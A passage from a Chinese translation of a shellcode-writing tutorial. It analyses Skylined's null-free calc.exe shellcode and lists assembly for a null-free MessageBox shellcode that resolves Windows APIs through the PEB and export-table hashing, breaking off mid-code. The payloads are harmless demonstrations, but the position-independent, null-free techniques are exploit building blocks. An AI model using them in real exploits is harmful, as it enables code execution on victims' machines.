00402052 682E657865 PUSH6578652E
00402057 6863616C63 PUSH636C6163
0040205C 54 PUSHESP
0040205D 870424 XCHGDWORDPTRSS:[ESP],EAX
00402060 50 PUSHEAX
00402061 FFD5 CALLEBP
00402063 CC INT3
他的代码和我的代码的最大不同点是什么？
三个不要的不同点：
获取 WinExecAPI地址的技术不同
用16位的哈希来找函数，在栈中的正确位置插入null字节
没有真正的退出函数...就让它崩溃（这意味着他只需要找到这个WinExecAPI的地址
让我们看下细节：
在我的代码里，我首先找kernel32的基地址，然后用那个基地址来找WinExec的函数地址
Skylined的代码背后的思想是：他不在乎得到kernel32的确切基地址...目标是得到WinExec
的函数地址
我们知道kernel32是InInitOrderModuleList中的第二个模块（Windows7中除外--第三个模
块）。因此他的代码只是到PEB中并跳到列表中的第二个模块。然后，不是得到基地址，代
码直接开始找函数（比较哈希）。如果WinExec没找到（这种情况发生在Windows7--因为
我们还没看kernel32），它就会到下一个模块中找WinExec...最终，当地址找到后，放到ebp
中。作为旁注，他的代码用16位的哈希（我的代码用32位的哈希）。这解释为什么“CMP
DX，0F510”指令能用（和DX=16位寄存器做比较）
这就是“thinkgoaloriented”的意思。这个代码做它需要做的，没有加上任何限制条件。你也
可以用这个代码来执行其他的东西，并且获得 WinExec函数地址的方法是通用的。所以我需
要找2个函数地址的假设是错误的--所有我真正需要注意的是使calc执行。你可以在这里获得
skylined的找函数地址的方法here
接下来，calc.exe入栈。但是没有null字节的踪迹？好的，如果你在调试器上运行这个代码，
你可以看到代码的前两个指令（XORESI，ESI 和 PUSHESI）将4个null字节入栈。当我
们到calc.exe入栈的地方时，它就在这些null字节之后...所以不需要在代码里面来用null字
节终止字符串...null已经在那里了，就在它们需要的地方。
然后，一个指向“calc.exe”的指针重新取回，用XCHGDWORDPTRSS：[ESP]，EAX。
由于EAX已经清零（因为XOREAX，EAX），这个指令实际上做两件事：将calc.exe的指
针放到eax中，但是同时，它将EAX中的null字节入栈。所以，eax指向calc.exe，并且堆
栈是这样的：
00000000
calc
.exe
00000000
这是用产生多种影响的指令的好例子，并且确认null字节已经在正确的位置上。
指针指向calc.exe（在EAX中），并且入栈，最后，调用callEBP（运行WinEx）。这个代码
以0xCC结束。
我们能使这个代码更短。不是将“calc.exe”入栈，你可以只将“calc”入栈（可以节省5个
字节）...但是这只是一个细节。这只是一个何时创造更短的，没有null字节的shellcode的
一个很棒的例子。把注意力集中在你想要代码做什么，然后用最短的路径来达到目标，同时
不失可移植性和可靠性。
跟往常一样：skylined做得很棒！
Skylined的资料使我重新看下我的MessageBoxshellcode，并且使它更短+没有null字节。我
早些产生的原始代码是310字节并且包含了33个null字节。在把它转化为Metasploit的模
块后，代码变得更短，同时null字节的数目减少了一点点...但是我们能做得更好。
为了使代码没有null字节，我们需要注意前跳转（因为这些指令会在shellcode中产生null
字节）。一个弥补这种缺陷的方法使用相关跳转（用偏移量，意味着我们不得不用GetPC程
序来开头）。接下来，我们将用一种不同的技术来获得kernel32的基地址，并且我们不会用
通用的循环来得到函数地址...我们只是调用find_function3次。最后，我们将用另一种技术
来将字符串入栈并得到指针。（我们用null字节sniper）。所有的这些组成了下面的代码：
;SampleshellcodethatwillpopaMessageBox
;withcustomtitleandtext
;smallerandnullbytefree
;WrittenbyPeterVanEeckhoutte
;http://www.corelan.be:8800
[Section.text]
[BITS32]
global_start
_start:
;getPC
FLDPI
FSTENV[ESP-0xC]
xoredx,edx
movdl,0x7A ;offsettostart_main
;skylinedtechnique
XOR ECX,ECX ;ECX=0
MOV ESI,[FS:ECX+0x30];ESI=&(PEB)([FS:0x30])
MOV ESI,[ESI+0x0C] ;ESI=PEB->Ldr
MOV ESI,[ESI+0x1C] ;ESI=PEB->Ldr.InInitOrder
next_module:
MOV EAX,[ESI+0x08] ;EBP=InInitOrder[X].base_address
MOV EDI,[ESI+0x20] ;EBP=InInitOrder[X].module_name(unicode)
MOV ESI,[ESI] ;ESI=InInitOrder[X].flink(nextmodule)
CMP [EDI+12*2],CL ;modulename[12]==0?
JNE next_module ;No:trynextmodule.
;jmpstart_main ;replacethiswithrelativejumpforward
popecx
addecx,edx
jmpecx ;jmpstart_main
;=======Function:Findfunctionbaseaddress============
find_function:
pushad ;saveallregisters
movebp, [esp + 0x24] ;putbaseaddressofmodulethatisbeing
;loadedinebp
moveax, [ebp + 0x3c] ;skipoverMSDOSheader
movedx, [ebp + eax + 0x78];gotoexporttableandputrelativeaddress
;inedx
addedx, ebp ;addbaseaddresstoit.
;edx=absoluteaddressofexporttable
movecx, [edx + 0x18] ;setupcounterECX
;(howmanyexporteditemsareinarray?)
movebx, [edx + 0x20] ;putnamestablerelativeoffsetinebx
addebx, ebp ;addbaseaddresstoit.
;ebx=absoluteaddressofnamestable
find_function_loop:
jecxz find_function_finished ;ifecx=0,thenlastsymbolhasbeenchecked.
;(shouldneverhappen)
;unlessfunctioncouldnotbefound
dececx ;ecx=ecx-1
movesi, [ebx + ecx * 4] ;getrelativeoffsetofthenameassociated
;withthecurrentsymbol
;andstoreoffsetinesi
addesi, ebp ;addbaseaddress.
;esi=absoluteaddressofcurrentsymbol
compute_hash:
xoredi, edi ;zerooutedi
xoreax, eax ;zeroouteax
cld ;cleardirectionflag.
;willmakesurethatitincrementsinsteadof
;decrementswhenusinglods*
compute_hash_again:
lodsb ;loadbytesatesi(currentsymbolname)
;intoal,+incrementesi
testal, al ;bitwisetest:
;seeifendofstringhasbeenreached
jz compute_hash_finished ;ifzeroflagisset=endofstringreached
roredi, 0xd ;ifzeroflagisnotset,rotatecurrent
;valueofhash13bitstotheright
addedi, eax ;addcurrentcharacterofsymbolname
;tohashaccumulator
jmpcompute_hash_again ;continueloop
compute_hash_finished:
find_function_compare:
cmpedi, [esp + 0x28] ;seeifcomputedhashmatchesrequestedhash
;(atesp+0x28)
;edi=currentcomputedhash
;esi=currentfunctionname(string)
jnzfind_function_loop ;nomatch,gotonextsymbol
movebx, [edx + 0x24] ;ifmatch:extractordinalstable
;relativeoffsetandputinebx
addebx, ebp ;addbaseaddress.
;ebx=absoluteaddressofordinalsaddresstable
movcx, [ebx + 2 * ecx] ;getcurrentsymbolordinalnumber(2bytes)
movebx, [edx + 0x1c] ;getaddresstablerelativeandputinebx
addebx, ebp ;addbaseaddress.
;ebx=absoluteaddressofaddresstable
moveax, [ebx + 4 * ecx] ;getrelativefunctionoffsetfromitsordinal
;andputineax
addeax, ebp ;addbaseaddress.
;eax=absoluteaddressoffunctionaddress
mov[esp + 0x1c], eax ;overwritestackcopyofeaxsopopad
;willreturnfunctionaddressineax
find_function_finished:
popad ;retrieveoriginalregisters.
;eaxwillcontainfunctionaddress
ret
;===================================================================
;===================MAINAPPLICATION==============================
;===================================================================
start_main:
movdl,0x08
subesp,edx ;allocatespaceonstacktostore2things:
;inthisorder:ptrtoLoadLibraryA,ExitProc
movebp,esp ;setebpasframeptrforrelativeoffset
;sowewillbeabletodothis:
;callebp+4 =ExecuteLoadLibraryA
;callebp+8 =ExecuteExitProcess
movedx,eax ;savebaseaddressofkernel32inedx
;getfirsthashandretrievefunctionaddress
;LoadLibrary
push0xEC0E4E8E
pushedx
callfind_function
;putfunctionaddressonstack(ebx+04)
mov[ebp+0x4],eax
;getsecondhashandretrievefunctionaddress
;forExitProcess
;baseaddressofkernel32isnowatesp,sowecandothis
movebx,0x73E2D87E
xchgebx,dword[esp]
pushedx
callfind_function
;storefunctionaaddressatebx+08
mov[ebp+0x8],eax
;doloadlibraryfirst-sofirstputpointertostringuser32.dlltostack
PUSH0xFF206c6c
PUSH0x642e3233
PUSH0x72657375
;overwritespacewithnullbyte
;we'llusenullbyteatbl
mov[esp+0xA],bl
;putpointertostringontopofstack
movesi,esp
pushesi
;pointerto"user32.dll"isnowontopofstack,sojustcallLoadLibrary
call[ebp+0x4]
;baseaddressofuser32.dllisnowineax(ifloadedcorrectly)
movedx,eax
;putitonstack
pusheax
;findtheMessageBoxAfunction
movebx,0xBC4DA2A8